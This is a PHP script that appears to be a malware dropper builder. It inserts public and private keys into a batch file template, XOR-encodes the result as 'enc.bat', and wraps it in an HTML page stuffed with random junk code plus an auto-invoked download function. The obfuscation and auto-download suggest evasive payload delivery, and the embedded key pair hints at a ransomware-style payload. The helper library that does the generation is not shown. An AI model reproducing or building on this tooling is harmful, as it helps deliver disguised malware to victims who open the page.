<?php
require_once("bicho53-lib.php");

define("INCLUDE_XOR_STREAM",1);

$htmlPage = '
<html>
  <body>
    <!--__random_string__-->
    <!--__random_string2__-->
    <input type="hidden" />
    <!--__random_string__-->
    <script>
    <!--__random_code__-->
    <!--__download_function__-->
    <!--__random_code__-->
    <!--__invoke_download__-->
    <!--__random_code__-->
    </script>
    <!--__random_string__-->
  </body>
</html>
';
$filename = "bicho53-3.bat.orig";
$contents = file_get_contents($filename);

$contents = str_replace("__PUBKEY__", explode("\r",explode("\n",file_get_contents("bicho53-2-pub.xml"))[0])[0], $contents);
$contents = str_replace("__PRIVKEY__", explode("\r",explode("\n",file_get_contents("bicho53-2-priv.xml"))[0])[0], $contents);

if (defined("INCLUDE_XOR_STREAM")){
  $file = generateBatFile2("bicho53-2.bat.orig",$contents," ","enc.bat");
} else {
  $file = generateBatFile1("bicho53-1.bat.orig",$contents," ","enc.bat");
}

echo generatePage($htmlPage,$file);
